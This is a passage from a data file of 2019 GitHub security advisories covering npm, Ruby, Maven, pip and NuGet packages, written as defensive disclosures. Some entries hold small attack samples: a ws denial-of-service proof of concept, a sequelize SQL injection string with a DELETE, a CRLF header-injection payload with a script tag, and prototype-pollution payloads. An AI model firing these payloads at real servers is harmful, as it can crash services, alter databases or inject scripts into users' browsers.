The problem has been patched in 0.71.0, users should upgrade to this or a newer version (if one exists).

### Workarounds
Users can workaround the problem by disabling persistent connections, though this may cause performance implications.

### References
See the [patch](https://github.com/excon/excon/commit/ccb57d7a422f020dc74f1de4e8fb505ab46d8a29) for further details.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [excon/issues](https://github.com/excon/excon/issues)
* Email us at [geemus+github@gmail.com](mailto:geemus+github@gmail.com)",rubygems
934,16105,npm,GHSA-4328-8hgf-7wjr,CVE-2019-16777,https://github.com/advisories/GHSA-4328-8hgf-7wjr,high,2019-12-13 15:39:32 UTC,npm Vulnerable to Global node_modules Binary Overwrite,"Versions of  the npm CLI prior to 6.13.4 are vulnerable to a Global node_modules Binary Overwrite. It fails to prevent existing globally-installed binaries to be overwritten by other package installations. 

For example, if a package was installed globally and created a `serve` binary, any subsequent installs of packages that also create a `serve` binary would overwrite the first binary. This will not overwrite system binaries but only binaries put into the global node_modules directory.

This behavior is still allowed in local installations and also through install scripts. This vulnerability bypasses a user using the --ignore-scripts install option.


## Recommendation

Upgrade to version 6.13.4 or later.",npm
935,16105,npm,GHSA-x8qc-rrcw-4r46,CVE-2019-16776,https://github.com/advisories/GHSA-x8qc-rrcw-4r46,high,2019-12-13 15:39:26 UTC,npm symlink reference outside of node_modules,"Versions of the npm CLI prior to 6.13.3 are vulnerable to a symlink reference outside of node_modules. It is possible for packages to create symlinks to files outside of the`node_modules` folder through the `bin` field upon installation. A properly constructed entry in the package.json bin field would allow a package publisher to create a symlink pointing to arbitrary files on a user’s system when the package is installed. Only files accessible by the user running the `npm install` are affected.  

This behavior is still possible through install scripts. This vulnerability bypasses a user using the --ignore-scripts install option.


## Recommendation

Upgrade to version 6.13.3 or later.",npm
936,16044,ws,GHSA-5v72-xg48-5rpm,,https://github.com/advisories/GHSA-5v72-xg48-5rpm,high,2019-06-04 19:37:52 UTC,Denial of Service in ws,"Affected versions of `ws` can crash when a specially crafted `Sec-WebSocket-Extensions` header containing `Object.prototype` property names as extension or parameter names is sent.

## Proof of concept

```
const WebSocket = require('ws');
const net = require('net');

const wss = new WebSocket.Server({ port: 3000 }, function () {
  const payload = 'constructor';  // or ',;constructor'

  const request = [
    'GET / HTTP/1.1',
    'Connection: Upgrade',
    'Sec-WebSocket-Key: test',
    'Sec-WebSocket-Version: 8',
    `Sec-WebSocket-Extensions: ${payload}`,
    'Upgrade: websocket',
    '\r\n'
  ].join('\r\n');

  const socket = net.connect(3000, function () {
    socket.resume();
    socket.write(request);
  });
});
```


## Recommendation

Update to version 3.3.1 or later.",npm
937,38043,com.linecorp.armeria:armeria,GHSA-35fr-h7jr-hh86,,https://github.com/advisories/GHSA-35fr-h7jr-hh86,moderate,2019-12-06 18:55:47 UTC,Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting') in Armeria,"Versions of Armeria 0.85.0 through and including 0.96.0 are vulnerable to HTTP response splitting, which allows remote attackers to inject arbitrary HTTP headers via CRLF sequences when unsanitized data is used to populate the headers of an HTTP response.

### Impact

1. Cross-User Defacement
2. Cache Poisoning
3. Cross-Site Scripting (XSS)
4. Page Hijacking


### Root Cause

The root cause is due to the usage of Netty without the HTTP header validation.

https://github.com/line/armeria/blob/f0d870fde1088114070be31b67f7df0a21e835c6/core/src/main/java/com/linecorp/armeria/common/DefaultHttpHeaders.java#L23

### Patches

This vulnerability has been patched in 0.97.0.

### References

[CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')](https://cwe.mitre.org/data/definitions/113.html)
https://github.com/ratpack/ratpack/security/advisories/GHSA-mvqp-q37c-wf9j

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [GitHub](https://github.com/line/armeria/issues)",maven
938,18987,puma,GHSA-7xx3-m584-x994,CVE-2019-16770,https://github.com/advisories/GHSA-7xx3-m584-x994,moderate,2019-12-05 19:26:37 UTC,A poorly-behaved client could use keepalive requests to monopolize Puma's reactor and create a denial of service attack,"## Keepalive thread overload/DoS

### Impact

A poorly-behaved client could use keepalive requests to monopolize Puma's reactor and create a denial of service attack.

If more keepalive connections to Puma are opened than there are threads available, additional connections will wait permanently if the attacker sends requests frequently enough.

### Patches

This vulnerability is patched in Puma 4.3.1 and 3.12.2.

### Workarounds

Reverse proxies in front of Puma could be configured to always allow less than X keepalive connections to a Puma cluster or process, where X is the number of threads configured in Puma's thread pool.

### For more information

If you have any questions or comments about this advisory:

* Open an issue at [puma](github.com/puma/puma).",rubygems
939,17203,serialize-javascript,GHSA-h9rv-jmmf-4pgx,CVE-2019-16769,https://github.com/advisories/GHSA-h9rv-jmmf-4pgx,moderate,2019-12-05 18:44:37 UTC,Cross-Site Scripting in serialize-javascript,"Versions of `serialize-javascript` prior to 2.1.1 are vulnerable to Cross-Site Scripting (XSS). The package fails to sanitize serialized regular expressions. This vulnerability does not affect Node.js applications.


## Recommendation

Upgrade to version 2.1.1 or later.",npm
940,38043,com.linecorp.armeria:armeria,GHSA-24r8-fm9r-cpj2,CVE-2019-16771,https://github.com/advisories/GHSA-24r8-fm9r-cpj2,low,2019-12-05 18:40:51 UTC,Low severity vulnerability that affects com.linecorp.armeria:armeria,"## Multiple timing attack vulnerabilities leading to the recovery of secrets based on the use of non-constant time compare function

### Impact

String comparison method in multiple authentication validation in Armeria were known to be vulnerable to timing attacks. This vulnerability is caused by the insecure implementation of `equals` method from `java.lang.String`. While this attack is not practically possible, an attacker still has a potential to attack if the victim's server validates user by using `equals` method.

We would like to thank @chrsow for pointing out the issue.

## Potentially vulnerable codes

https://github.com/line/armeria/blob/f0d870fde1088114070be31b67f7df0a21e835c6/core/src/main/java/com/linecorp/armeria/server/auth/OAuth2Token.java#L54
https://github.com/line/armeria/blob/f0d870fde1088114070be31b67f7df0a21e835c6/core/src/main/java/com/linecorp/armeria/server/auth/BasicToken.java#L64

### Patches

There are two options to patch this issue.

1. Remove `equals` method; it has been exclusively used for test cases and was never used in any OSS projects that are using Armeria. (But it is worth noting that there are possibilities of closed projects authenticating users by utilizing `equals` method)

2. Use `MessageDigest.isEqual` to compare the credential instead.

### Workarounds

1. Update to the latest version (TBD)

2-1. Users can prevent these vulnerabilities by modifying and implementing timing attack preventions by themselves.

2-2. Precisely speaking, it is possible to compare credentials by securely comparing them after calling methods to directly return the input (namely `Object. accessToken()`, `Object.username()` and `Object.password()`).

### References
- https://cwe.mitre.org/data/definitions/208.html
- https://security.stackexchange.com/questions/111040/should-i-worry-about-remote-timing-attacks-on-string-comparison

### Side Note

Since it is a theoretical attack, there is no PoC available from neither the vendor nor the security team.",maven
941,16587,lodash-es,GHSA-jf85-cpcp-j695,CVE-2019-10744,https://github.com/advisories/GHSA-jf85-cpcp-j695,critical,2019-07-10 19:45:23 UTC,Prototype Pollution in lodash,"Versions of `lodash` before 4.17.12 are vulnerable to Prototype Pollution.  The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.




## Recommendation

Update to version 4.17.12 or later.",npm
942,19979,ecdsa,GHSA-2mrj-435v-c2cr,,https://github.com/advisories/GHSA-2mrj-435v-c2cr,moderate,2019-12-02 18:15:31 UTC,possible DoS caused by malformed signature decoding in Pure-Python ECDSA,**Withdrawn:** Duplicate of GHSA-pwfw-mgfj-7g3g.,pip
943,33935,org.eclipse.jetty:jetty-server,GHSA-5h9j-q6j2-253f,CVE-2019-17632,https://github.com/advisories/GHSA-5h9j-q6j2-253f,moderate,2019-12-02 18:13:28 UTC,Unescaped exception messages in error responses in Jetty,"In Eclipse Jetty versions 9.4.21.v20190926, 9.4.22.v20191022, and 9.4.23.v20191118, the generation of default unhandled Error response content (in text/html and text/json Content-Type) does not escape Exception messages in stacktraces included in error output.",maven
944,19780,chartkick,GHSA-5pm8-492c-92p5,CVE-2019-18841,https://github.com/advisories/GHSA-5pm8-492c-92p5,high,2019-12-02 18:04:11 UTC,Prototype Pollution in chartkick,"Affected versions of `@polymer/polymer` are vulnerable to prototype pollution. The package fails to prevent modification of object prototypes through chart options containing a payload such as `{""__proto__"": {""polluted"": true}}`. It is possible to achieve the same results if a chart loads data from a malicious server.


## Recommendation

Upgrade to version 3.2.0 or later.",rubygems
945,20163,typed-ast,GHSA-7xxv-wpxj-mx5v,CVE-2019-19275,https://github.com/advisories/GHSA-7xxv-wpxj-mx5v,high,2019-12-02 18:03:09 UTC,Out-of-bounds read in typed-ast and cpython may allow an attacker to crash the interpreter process (ast_for_arguments case).,"typed_ast 1.3.0 and 1.3.1 has an ast_for_arguments out-of-bounds read. An attacker with the ability to cause a Python interpreter to parse Python source (but not necessarily execute it) may be able to crash the interpreter process. This could be a concern, for example, in a web-based service that parses (but does not execute) Python code. (This issue also affected certain Python 3.8.0-alpha prereleases.)",pip
946,20163,typed-ast,GHSA-m3jw-62m7-jjcm,CVE-2019-19274,https://github.com/advisories/GHSA-m3jw-62m7-jjcm,high,2019-12-02 18:02:02 UTC,Out-of-bounds read in typed-ast and cpython may allow an attacker to crash the interpreter process (handle_keywordonly_args case).,"typed_ast 1.3.0 and 1.3.1 has a handle_keywordonly_args out-of-bounds read. An attacker with the ability to cause a Python interpreter to parse Python source (but not necessarily execute it) may be able to crash the interpreter process. This could be a concern, for example, in a web-based service that parses (but does not execute) Python code. (This issue also affected certain Python 3.8.0-alpha prereleases.)",pip
947,18682,vant,GHSA-9xr8-8hmc-389f,,https://github.com/advisories/GHSA-9xr8-8hmc-389f,high,2019-11-22 13:45:33 UTC,Cross-Site Scripting in vant,"Versions of `vant` prior to 2.1.8 are vulnerable to Cross-Site Scripting. The text value of the `Picker` component column is not sanitized, which may allow attackers to execute arbitrary JavaScript in a victim's browser.


## Recommendation

Upgrade to version 2.1.8 or later.",npm
948,20810,apache-airflow,GHSA-q3p4-gw7r-wqjc,CVE-2019-12417,https://github.com/advisories/GHSA-q3p4-gw7r-wqjc,moderate,2019-11-22 13:45:22 UTC,A malicious admin user could edit the state of objects in the Airflow metadata database to execute arbitrary javascript on certain page views,A malicious admin user could edit the state of objects in the Airflow metadata database to execute arbitrary javascript on certain page views. This also presented a Local File Disclosure vulnerability to any file readable by the webserver process.,pip
949,16174,angular,GHSA-89mq-4x47-5v83,CVE-2019-10768,https://github.com/advisories/GHSA-89mq-4x47-5v83,high,2019-11-20 15:29:43 UTC,Prototype Pollution in angular,"Versions of `angular ` prior to 1.7.9 are vulnerable to prototype pollution. The deprecated API function `merge()` does not restrict the modification of an Object's prototype in the , which may allow an attacker to add or modify an existing property that will exist on all objects.




## Recommendation

Upgrade to version 1.7.9 or later. The function was already deprecated and upgrades are not expected to break functionality.",npm
950,20568,rpyc,GHSA-9ggp-4jpr-7ppj,,https://github.com/advisories/GHSA-9ggp-4jpr-7ppj,high,2019-11-20 01:35:53 UTC,Possible remote code execution via a remote procedure call,"Withdrawn: duplicate of GHSA-pj4g-4488-wmxm

## Original Description

In RPyC 4.1.x through 4.1.1, a remote attacker can dynamically modify object attributes to construct a remote procedure call that executes code for an RPyC service with default configuration settings.",pip
951,34497,io.undertow:undertow-core,GHSA-8vh8-vc28-m2hf,CVE-2019-10212,https://github.com/advisories/GHSA-8vh8-vc28-m2hf,critical,2019-11-20 01:33:54 UTC,Potential to access user credentials from the log files when debug logging enabled,"A flaw was found in, all under 2.0.20, in the Undertow DEBUG log for io.undertow.request.security. If enabled, an attacker could abuse this flaw to obtain the user's credentials from the log files.",maven
952,15223,DotNetNuke.Core,GHSA-5whq-j5qg-wjvp,CVE-2019-12562,https://github.com/advisories/GHSA-5whq-j5qg-wjvp,moderate,2019-11-18 17:16:06 UTC,Stored Cross-Site Scripting vulnerability in admin component of DotNetNuke,Cross-site scripting (XSS) is possible in DNN (formerly DotNetNuke) before 9.4.0 by remote authenticated users via the Display Name field in the admin notification function.,nuget
953,34929,org.apache.tapestry:tapestry-core,GHSA-89r3-rcpj-h7w6,CVE-2019-0207,https://github.com/advisories/GHSA-89r3-rcpj-h7w6,high,2019-11-18 17:19:03 UTC,Path traversal attack on Windows platforms,"Tapestry processes assets `/assets/ctx` using classes chain `StaticFilesFilter -> AssetDispatcher -> ContextResource`, which doesn't filter the character `\`, so attacker can perform a path traversal attack to read any files on Windows platform.",maven
954,19489,rack-cors,GHSA-pf8f-w267-mq2h,CVE-2019-18978,https://github.com/advisories/GHSA-pf8f-w267-mq2h,moderate,2019-11-15 20:26:59 UTC,The rack-cors rubygem may allow directory traveral,An issue was discovered in the rack-cors (aka Rack CORS Middleware) gem before 1.0.4 for Ruby. It allows ../ directory traversal to access private resources because resource matching does not ensure that pathnames are in a canonical format.,rubygems
955,19784,json-jwt,GHSA-cff7-6h4q-q5pj,CVE-2019-18848,https://github.com/advisories/GHSA-cff7-6h4q-q5pj,high,2019-11-14 15:25:51 UTC,Lacked element count during splitting of JWE string,The json-jwt gem before 1.11.0 for Ruby lacks an element count during the splitting of a JWE string.,rubygems
956,34450,org.opencms:opencms-core,GHSA-fxp8-7h5w-h235,CVE-2019-13234,https://github.com/advisories/GHSA-fxp8-7h5w-h235,moderate,2019-11-12 22:58:11 UTC,XSS in search engine,"In the Alkacon OpenCms Apollo Template 10.5.4 and 10.5.5, there is XSS in the search engine.",maven
957,34450,org.opencms:opencms-core,GHSA-36hf-6hp2-9g4c,CVE-2019-13237,https://github.com/advisories/GHSA-36hf-6hp2-9g4c,moderate,2019-11-12 22:58:14 UTC,Local file inclusion allows unauthorized access to internal resources in Alkacon OpenCms,"In Alkacon OpenCms 10.5.4 and 10.5.5, there are multiple resources vulnerable to Local File Inclusion that allow an attacker to access server resources: clearhistory.jsp, convertxml.jsp, group_new.jsp, loginmessage.jsp, xmlcontentrepair.jsp, and /system/workplace/admin/history/settings/index.jsp.",maven
958,34450,org.opencms:opencms-core,GHSA-2p6p-v69p-9mm9,CVE-2019-13235,https://github.com/advisories/GHSA-2p6p-v69p-9mm9,moderate,2019-11-12 22:58:16 UTC,XSS in login form,"In the Alkacon OpenCms Apollo Template 10.5.4 and 10.5.5, there is XSS in the Login form.",maven
959,34450,org.opencms:opencms-core,GHSA-7qqr-3pj3-q2f5,CVE-2019-13236,https://github.com/advisories/GHSA-7qqr-3pj3-q2f5,moderate,2019-11-12 22:58:21 UTC,XSS issues in the management interface,"In system/workplace/ in Alkacon OpenCms 10.5.4 and 10.5.5, there are multiple Reflected and Stored XSS issues in the management interface.",maven
960,16330,sequelize,GHSA-2598-2f59-rmhq,CVE-2019-10749,https://github.com/advisories/GHSA-2598-2f59-rmhq,critical,2019-11-08 17:05:17 UTC,SQL Injection in sequelize,"Versions of `sequelize` prior to 3.35.1 are vulnerable to SQL Injection. The package fails to sanitize JSON path keys in the Postgres dialect,  which may allow attackers to inject SQL statements and execute arbitrary SQL queries.


## Recommendation

Upgrade to version 3.35.1 or later.",npm
961,20024,notebook,GHSA-jqwc-jm56-wcwj,CVE-2018-21030,https://github.com/advisories/GHSA-jqwc-jm56-wcwj,moderate,2019-11-08 17:07:42 UTC,Cross-site scripting in Jupyter Notebook,"Jupyter Notebook before 5.5.0 does not use a CSP header to treat served files as belonging to a separate origin. Thus, for example, an XSS payload can be placed in an SVG document.",pip
962,16330,sequelize,GHSA-j9xp-92vc-559j,CVE-2019-10748,https://github.com/advisories/GHSA-j9xp-92vc-559j,critical,2019-11-06 17:11:10 UTC,SQL Injection in sequelize,"Affected versions of `sequelize` are vulnerable to SQL Injection. The package fails to sanitize JSON path keys in the MariaDB and MySQL dialects,  which may allow attackers to inject SQL statements and execute arbitrary SQL queries.


## Recommendation

If you are using `sequelize` 5.x, upgrade to version 5.8.11 or later.
If you are using `sequelize` 4.x, upgrade to version 4.44.3 or later.
If you are using `sequelize` 3.x, upgrade to version 3.35.1 or later.",npm
963,35004,org.pac4j:pac4j-saml,GHSA-rc75-cf5c-mxvh,CVE-2019-10755,https://github.com/advisories/GHSA-rc75-cf5c-mxvh,moderate,2019-11-06 17:06:28 UTC,Use of Cryptographically Weak Pseudo-Random Number Generator in org.pac4j:pac4j-saml,The SAML identifier generated within SAML2Utils.java was found to make use of the apache commons-lang3 RandomStringUtils class which makes them predictable due to RandomStringUtils PRNG's algorithm not being cryptographically strong. This issue only affects the 3.X release of pac4j-saml.,maven
964,15387,MetadataExtractor,GHSA-cwqq-w8c3-r2jw,CVE-2019-14262,https://github.com/advisories/GHSA-cwqq-w8c3-r2jw,high,2019-08-23 00:04:56 UTC,Uncontrolled Resource Consumption in MetadataExtractor,MetadataExtractor 2.1.0 allows stack consumption.,nuget
965,15581,Auth0.AuthenticationApi,GHSA-c9cg-q8r2-xvjq,CVE-2019-16929,https://github.com/advisories/GHSA-c9cg-q8r2-xvjq,high,2019-10-24 20:56:12 UTC,Improper Authentication in Auth0.AuthenticationApi,Auth0 auth0.net before 6.5.4 has Incorrect Access Control because IdentityTokenValidator can be accidentally used to validate untrusted ID tokens.,nuget
966,19467,loofah,GHSA-c3gv-9cxf-6f57,CVE-2019-15587,https://github.com/advisories/GHSA-c3gv-9cxf-6f57,low,2019-11-05 23:58:25 UTC,Cross-site Scripting in Loofah,In the Loofah gem for Ruby through v2.3.0 unsanitized JavaScript may occur in sanitized output when a crafted SVG element is republished.,rubygems
967,16330,sequelize,GHSA-m9jw-237r-gvfv,CVE-2019-10752,https://github.com/advisories/GHSA-m9jw-237r-gvfv,critical,2019-10-25 19:43:16 UTC,SQL Injection in sequelize,"Affected versions of `sequelize` are vulnerable to SQL Injection. The function `sequelize.json()` incorrectly formatted sub paths for JSON queries, which allows attackers to inject SQL statements and execute arbitrary SQL queries if user input is passed to the query.  Exploitation example:  
```return User.findAll({
  where: this.sequelize.json(""data.id')) AS DECIMAL) = 1 DELETE YOLO INJECTIONS; -- "", 1)
});```


## Recommendation

If you are using `sequelize` 5.x, upgrade to version 5.15.1 or later.
If you are using `sequelize` 4.x, upgrade to version 4.44.3 or later.",npm
968,37556,io.projectreactor.netty:reactor-netty,GHSA-j52r-xc68-q8f4,CVE-2019-11284,https://github.com/advisories/GHSA-j52r-xc68-q8f4,high,2019-10-23 14:14:32 UTC,Insufficiently Protected Credentials in Pivotal Reactor Netty,"Pivotal Reactor Netty, versions prior to 0.8.11, passes headers through redirects, including authorization ones. A remote unauthenticated malicious user may gain access to credentials for a different server than they have access to.",maven
969,36737,io.ratpack:ratpack-core,GHSA-mvqp-q37c-wf9j,CVE-2019-17513,https://github.com/advisories/GHSA-mvqp-q37c-wf9j,high,2019-10-21 16:08:43 UTC,io.ratpack:ratpack-core vulnerable to Improper Neutralization of Special Elements in Output ('Injection'),"## CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')

Versions of Ratpack 0.9.1 through and including 1.7.4 are vulnerable to [HTTP Response Splitting](https://www.owasp.org/index.php/HTTP_Response_Splitting), 
if untrusted and unsanitized data is used to populate the headers of an HTTP response.
An attacker can utilize this vulnerability to have the server issue any HTTP response they specify.

If your application uses arbitrary user input as the value of a response header it is vulnerable.
If your application does not use arbitrary values as response header values, it is not vulnerable.

Previously, Ratpack did not validate response header values.
Now, adding a header value that contains the header value termination characters (CRLF) produces a runtime exception.
Since there is no mechanism for escaping or encoding the termination characters in a String, a runtime exception is necessary.

As potentially dangerous values now cause runtime exceptions, it is a good idea to continue to validate and sanitize any user-supplied values being used as response headers.

We would like to thank [Jonathan Leitschuh](https://github.com/JLLeitschuh) for reporting this vulnerability.

### Vulnerable Example

The following example server uses a query parameter value as a response header, without validating or sanitizing it.
```java
RatpackServer startedServer =  RatpackServer.start(server -> {
    server.handlers(chain -> chain.all(ctx -> {
        // User supplied query parameter
        String header = ctx.getRequest().getQueryParams().get(""header"");
        // User supplied data used to populate a header value.
        ctx.header(""the-header"", header)
            .render(""OK!"");
    }));
});
```

Sending a request to the server with the following value for the `header` query param would allow the execution of arbitrary Javascript.

```
Content-Type: text/html
X-XSS-Protection: 0

<script>alert(document.domain)</script>
```

### Impact

- Cross-User Defacement
- Cache Poisoning
- Cross-Site Scripting
- Page Hijacking

### Patches

This vulnerability has been patched in Ratpack version 1.7.5.

### Root Cause

The root cause was due to using the netty `DefaultHttpHeaders` object with verification disabled.

https://github.com/ratpack/ratpack/blob/af1e8c8590f164d7dd84d4212886fad4ead99080/ratpack-core/src/main/java/ratpack/server/internal/NettyHandlerAdapter.java#L159

This vulnerability is now more clearly documented in the Netty documentation: https://github.com/netty/netty/pull/9646

### Workarounds

The workaround for this vulnerability is to either not use arbitrary input as response header values or validate such values before being used to ensure they don't contain a carriage return and/or line feed characters.

### References

 - [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')](https://cwe.mitre.org/data/definitions/113.html)
 - Fix commit: https://github.com/ratpack/ratpack/commit/efb910d38a96494256f36675ef0e5061097dd77d
 
### For more information

If you have any questions or comments about this advisory:
* Open an issue in [ratpack/ratpack](https://github.com/ratpack/ratpack/issues)
* Ask in our [Slack channel](https://slack-signup.ratpack.io/)",maven
970,16491,knex,GHSA-58v4-qwx5-7f59,CVE-2019-10757,https://github.com/advisories/GHSA-58v4-qwx5-7f59,critical,2019-10-21 16:12:13 UTC,SQL Injection in knex,"knex.js versions before 0.19.5 are vulnerable to SQL Injection attack. Identifiers are escaped incorrectly as part of the MSSQL dialect, allowing attackers to craft a malicious query to the host DB.",npm
971,34428,com.nimbusds:nimbus-jose-jwt,GHSA-f6vf-pq8c-69m4,CVE-2019-17195,https://github.com/advisories/GHSA-f6vf-pq8c-69m4,critical,2019-10-16 18:31:17 UTC,Improper Check for Unusual or Exceptional Conditions in Connect2id Nimbus JOSE+JWT,"Connect2id Nimbus JOSE+JWT before v7.9 can throw various uncaught exceptions while parsing a JWT, which could result in an application crash (potential information disclosure) or a potential authentication bypass.",maven
972,18868,haml,GHSA-r53w-g4xm-3gc6,CVE-2017-1002201,https://github.com/advisories/GHSA-r53w-g4xm-3gc6,moderate,2019-10-21 21:59:13 UTC,Cross-site scripting in Haml,"In haml versions prior to version 5.0.0.beta.2, when using user input to perform tasks on the server, characters like < > "" ' must be escaped properly. In this case, the ' character was missed. An attacker can manipulate the input to introduce additional attributes, potentially executing code.",rubygems
973,17054,csv-parse,GHSA-582f-p4pg-xc74,CVE-2019-17592,https://github.com/advisories/GHSA-582f-p4pg-xc74,high,2019-10-15 20:06:16 UTC,Regular Expression Denial of Service in csv-parse,"Versions of `csv-parse` prior to 4.4.6 are vulnerable to Regular Expression Denial of Service. The `__isInt()` function contains a malformed regular expression that processes large specially-crafted input very slowly, leading to a Denial of Service. This is triggered when using the `cast` option.


## Recommendation

Upgrade to version 4.4.6 or later.",npm
974,19476,netaddr,GHSA-49pj-69vf-c689,CVE-2019-17383,https://github.com/advisories/GHSA-49pj-69vf-c689,critical,2019-10-14 21:43:19 UTC,netaddr before 1.5.3 and 2.0.4 has Incorrect Default Permissions,"The netaddr gem before 1.5.3 and 2.0.4 for Ruby has misconfigured file permissions, such that a gem install may result in 0777 permissions in the target filesystem.",rubygems
975,16038,mongoose,GHSA-8687-vv9j-hgph,CVE-2019-17426,https://github.com/advisories/GHSA-8687-vv9j-hgph,critical,2019-10-22 20:19:54 UTC,Improper Input Validation in Automattic Mongoose,"Automattic Mongoose through 5.7.4 allows attackers to bypass access control (in some applications) because any query object with a _bsontype attribute is ignored. For example, adding ""_bsontype"":""a"" can sometimes interfere with a query filter. NOTE: this CVE is about Mongoose's failure to work around this _bsontype special case that exists in older versions of the bson parser (aka the mongodb/js-bson project).",npm
976,19979,ecdsa,GHSA-pwfw-mgfj-7g3g,CVE-2019-14853,https://github.com/advisories/GHSA-pwfw-mgfj-7g3g,high,2019-10-08 16:30:17 UTC,Improper Handling of Exceptional Conditions in ecdsa resulting in Denial of Service,"## possible DoS in signature verification and signature malleability 

### Impact
Code using `VerifyingKey.verify()` and `VerifyingKey.verify_digest()` may receive exceptions other than the documented `BadSignatureError` when signatures are malformed. If those other exceptions are not caught, they may lead to program termination and thus Denial of Service

Code using `VerifyingKey.verify()` and `VerifyingKey.verify_digest()` with `sigdecode` option using `ecdsa.util.sigdecode_der` will accept signatures even if they are not properly formatted DER. This makes the signatures malleable. It impacts only applications that later sign the signatures or verify signatures of signatures, e.g. Bitcoin.

All versions between 0.5 and 0.13.2 (inclusive) are thought to be vulnerable. Code before 0.5 may be vulnerable but didn't receive extended analysis to rule this issue out.

### Patches
The patches have been merged to `master` branch in https://github.com/warner/python-ecdsa/pull/115.
The backported patches for a release in the 0.13 branch are in https://github.com/warner/python-ecdsa/pull/124

They are part of the 0.13.3 release.

There are no plans to backport them to earlier releases.

### Workarounds
It may be possible to prevent the Denial of Service by catching also `UnexpectedDER`, `IndexError` and `AssertionError` exceptions. That list hasn't been verified to be complete though. If those exceptions are raised, the signature verification process should consider the signature to be invalid.

To remediate signature malleability and the Denial of Service vulnerability, it may be possible to first verify that the signature is properly DER formatted ECDSA-Sig-Value, as defined in [RFC3279](https://tools.ietf.org/html/rfc3279), before passing it to `verify()` or `verify_digest()` methods. If the signature is determined to not follow the DER or encode a different structure, the signature verification process should consider the signature to be invalid.

### References
https://en.bitcoinwiki.org/wiki/Transaction_Malleability

### For more information
If you have any questions or comments about this advisory please open an issue in [python-ecdsa](https://github.com/warner/python-ecdsa/issues) project.
",pip
977,18988,simple_form,GHSA-r74q-gxcg-73hx,CVE-2019-16676,https://github.com/advisories/GHSA-r74q-gxcg-73hx,critical,2019-09-30 19:41:15 UTC,Improper Input Validation in simple_form,"## Incorrect Access Control in `file_method?` in `lib/simple_form/form_builder.rb`; a user-supplied string is invoked as a method call

### Impact
For pages that build a form using user input, it is possible for an attacker to manipulate the input and send any method present in the form object. For example:

```erb
<%= simple_form_for @user do |f| %>
  <%= f.label @user_supplied_string %>
  ...
<% end %>
```

The string provided in the variable `@user_supplied_string` would be invoked as a method call inside the `@user` object (unless the string contains any of the following: `password`, `time_zone`, `country`, `email`, `phone` and `url`).

By manipulation that input, an attacker could do any of the following:

- Code execution (call actions like `#destroy`)
- Denial of Service (by executing a computation intensive method)
- Information Disclosure (check the presence of methods, leak user information)

### Patches
The problem was fixed in version `5.0`. Although it's a major version, there should be no issues with upgrading for `4.x`. The reason it was released in a major version is that the configuration `SimpleForm.file_methods` was deprecated in order to fix the problem.

### Workarounds
The issue only happens with pages that build forms based on user-provided input. If your application doesn't do that, you're not affected.
A workaround is to explicitly pass which type you want for an input since the issue lies on Simple Form's automatically discovery of input types. This can be done using the `as` option, like the following:
```erb
<%= form.input :avatar, as: :file %>
```

### References
[TDB]

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [https://github.com/plataformatec/simple_form](https://github.com/plataformatec/simple_form)
* Email us at [opensource@plataformatec.com.br](mailto:opensource@plataformatec.com.br)",rubygems
978,18887,rubyzip,GHSA-5m2v-hc64-56h6,CVE-2019-16892,https://github.com/advisories/GHSA-5m2v-hc64-56h6,moderate,2019-09-30 16:05:32 UTC,A crafted ZIP file can cause a denial of service in Rubyzip,"In Rubyzip before 1.3.0, a crafted ZIP file can bypass application checks on ZIP entry sizes because data about the uncompressed size can be spoofed. This allows attackers to cause a denial of service (disk consumption).",rubygems
979,34061,io.netty:netty-all,GHSA-p979-4mfw-53vg,CVE-2019-16869,https://github.com/advisories/GHSA-p979-4mfw-53vg,high,2019-10-11 18:41:23 UTC,HTTP Request Smuggling in Netty,"Netty before 4.1.42.Final mishandles whitespace before the colon in HTTP headers (such as a ""Transfer-Encoding : chunked"" line), which leads to HTTP request smuggling.",maven
980,34003,org.apache.commons:commons-compress,GHSA-53x6-4x5p-rrvv,CVE-2019-12402,https://github.com/advisories/GHSA-53x6-4x5p-rrvv,high,2019-10-11 18:41:08 UTC,Denial of Service in Apache Commons Compress,The file name encoding algorithm used internally in Apache Commons Compress 1.15 to 1.18 can get into an infinite loop when faced with specially crafted inputs. This can lead to a denial of service attack if an attacker can choose the file names inside of an archive created by Compress.,maven
981,34929,org.apache.tapestry:tapestry-core,GHSA-fgmr-vx7c-5wj6,CVE-2019-10071,https://github.com/advisories/GHSA-fgmr-vx7c-5wj6,critical,2019-09-26 21:30:34 UTC,Timing attack on HMAC signature comparison in Apache Tapestry,"The code which checks HMAC in form submissions used String.equals() for comparisons, which results in a timing side channel for the comparison of the HMAC signatures. This could lead to remote code execution if an attacker is able to determine the correct signature for their payload. The comparison should be done with a constant time algorithm instead.",maven
982,35825,org.keycloak:keycloak-core,GHSA-4fgq-gq9g-3rw7,CVE-2019-10201,https://github.com/advisories/GHSA-4fgq-gq9g-3rw7,moderate,2019-09-23 18:32:16 UTC,Improper Verification of Cryptographic Signature in keycloak,"It was found that Keycloak's SAML broker, versions up to 6.0.1, did not verify missing message signatures. If an attacker modifies the SAML Response and removes the <Signature> sections, the message is still accepted, and the message can be modified. An attacker could use this flaw to impersonate other users and gain access to sensitive information.",maven
983,35825,org.keycloak:keycloak-core,GHSA-p5xp-6vpf-jwvh,CVE-2019-10199,https://github.com/advisories/GHSA-p5xp-6vpf-jwvh,high,2019-09-23 18:32:27 UTC,Improper Input Validation and Cross-Site Request Forgery in Keycloak,"It was found that Keycloak's account console, up to 6.0.1, did not perform adequate header checks in some requests. An attacker could use this flaw to trick an authenticated user into performing operations via request from an untrusted domain.",maven
984,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-h822-r4r5-v8jg,CVE-2019-14540,https://github.com/advisories/GHSA-h822-r4r5-v8jg,critical,2019-09-23 18:33:25 UTC,Polymorphic Typing issue in FasterXML jackson-databind,A Polymorphic Typing issue was discovered in FasterXML jackson-databind before 2.9.10. It is related to com.zaxxer.hikari.HikariConfig.,maven
